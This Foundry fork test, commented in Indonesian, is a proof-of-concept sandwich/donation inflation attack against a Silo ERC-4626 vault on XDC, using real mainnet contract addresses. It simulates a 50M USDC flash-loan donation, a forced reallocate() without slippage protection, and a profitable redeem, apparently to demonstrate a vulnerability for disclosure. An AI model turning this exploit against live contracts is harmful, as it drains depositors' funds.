// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import {IERC20} from "openzeppelin5/token/ERC20/IERC20.sol";
import {IERC4626} from "openzeppelin5/interfaces/IERC4626.sol";

interface ISiloVault is IERC4626 {
    struct MarketAllocation {
        IERC4626 market;
        uint256 assets;
    }
    function reallocate(MarketAllocation[] calldata allocations) external;
}

contract SiloXDCRealisticForkTest is Test {
    string XDC_RPC_URL = "https://erpc.xinfin.network/"; 
    
    address constant USDC = 0xfA2958CB79b0491CC627c1557F441eF849Ca8eb1;
    address constant SILO_VAULT = 0x06083Db34F1E915FA5cd4e2A198f3680E3CE9c60; 
    address constant EXTERNAL_MARKET = 0xB38658B163E364DfFFDBC895f1b5d658d5e6C439; 
    address constant SOURCE_MARKET = 0xd1ed56Ed95c02634D9e2385A04cd5b97078dd932; 
    
    address constant ALLOCATOR = 0x8e65743e23Ed13f593E7d4eb7ED3ddE1E1cB9bBf; 

    function setUp() public {
        uint256 forkId = vm.createFork(XDC_RPC_URL);
        vm.selectFork(forkId);
    }

    function test_RealisticSandwichAttack() public {
        uint256 initialVaultTVL = IERC4626(SILO_VAULT).totalAssets();
        console.log("=== STATUS AWAL ===");
        console.log("Vault TVL Asli :", initialVaultTVL);
        
        address attacker = address(0xBAD);
        
        // 1. SIMULASI FLASH LOAN: Attacker meminjam 50 Juta USDC (Sangat Realistis di DeFi)
        uint256 flashLoanAmount = 50_000_000 * 1e6; // Asumsi USDC 6 decimals
        uint256 attackerInitialCapital = 1_000 * 1e6; // Modal murni attacker
        deal(USDC, attacker, flashLoanAmount + attackerInitialCapital); 

        // ==========================================================
        // TAHAP 1: FRONT-RUN (Inflasi Harga Market)
        // ==========================================================
        vm.startPrank(attacker);
        IERC20(USDC).approve(EXTERNAL_MARKET, type(uint256).max);
        
        // Attacker menyetor modal kecil untuk mendapatkan "Shares" (Saham)
        uint256 attackerShares = IERC4626(EXTERNAL_MARKET).deposit(attackerInitialCapital, attacker);
        
        // Attacker mendonasikan uang Flash Loan (50 Jt) ke Market secara langsung
        // Ini membuat nilai "1 Share" menjadi sangat mahal secara instan (Spot Manipulation)
        IERC20(USDC).transfer(EXTERNAL_MARKET, flashLoanAmount);
        vm.stopPrank();

        console.log("\n[!] Front-Run Berhasil: Attacker mendonasi 50M USDC untuk merusak harga EIP-4626 Vault.");

        // ==========================================================
        // TAHAP 2: EKSEKUSI TARGET (Vault Reallocation)
        // ==========================================================
        vm.startPrank(ALLOCATOR);
        ISiloVault.MarketAllocation[] memory allocations = new ISiloVault.MarketAllocation[](2);
        
        uint256 sourceShares = IERC20(SOURCE_MARKET).balanceOf(SILO_VAULT);
        uint256 currentSupplyAssets = IERC4626(SOURCE_MARKET).convertToAssets(sourceShares);
        
        // Vault memindahkan 1,000 USDC ke External Market
        uint256 targetMoveAmount = 1_000 * 1e6; 
        
        allocations[0] = ISiloVault.MarketAllocation({
            market: IERC4626(SOURCE_MARKET),
            assets: currentSupplyAssets - targetMoveAmount 
        });
        allocations[1] = ISiloVault.MarketAllocation({
            market: IERC4626(EXTERNAL_MARKET),
            assets: type(uint256).max 
        });
        
        // TRANSAKSI INI HARUSNYA DIREVERT JIKA ADA SLIPPAGE PROTECTION!
        ISiloVault(SILO_VAULT).reallocate(allocations);
        vm.stopPrank();
        
        console.log("[!] Vault mengeksekusi reallocate() tanpa Slippage Protection.");

        // ==========================================================
        // TAHAP 3: BACK-RUN (Attacker Menarik Keuntungan)
        // ==========================================================
        vm.startPrank(attacker);
        // Attacker menebus sahamnya. Karena harga mahal, dia menarik uang donasinya 
        // DITAMBAH uang yang baru saja disetorkan oleh Vault!
        IERC4626(EXTERNAL_MARKET).redeem(attackerShares, attacker, attacker);
        vm.stopPrank();

        // ==========================================================
        // HASIL AKHIR (PEMBUKTIAN)
        // ==========================================================
        uint256 finalVaultTVL = IERC4626(SILO_VAULT).totalAssets();
        console.log("\n=== STATUS AKHIR ===");
        console.log("Vault TVL Setelah Serangan :", finalVaultTVL);

        if (finalVaultTVL < initialVaultTVL) {
            console.log("\n[+] EKSPLOITASI BERHASIL!");
            console.log("[+] Kerugian Permanen Vault:", initialVaultTVL - finalVaultTVL, "USDC");
            console.log("[+] Alasan: Dana Vault terserap oleh Inflation Attack karena ketiadaan parameter minAssetsOut.");
        } else {
            console.log("\n[-] Eksploitasi gagal. Market terlindungi (mungkin menggunakan internal accounting).");
        }
    }
}
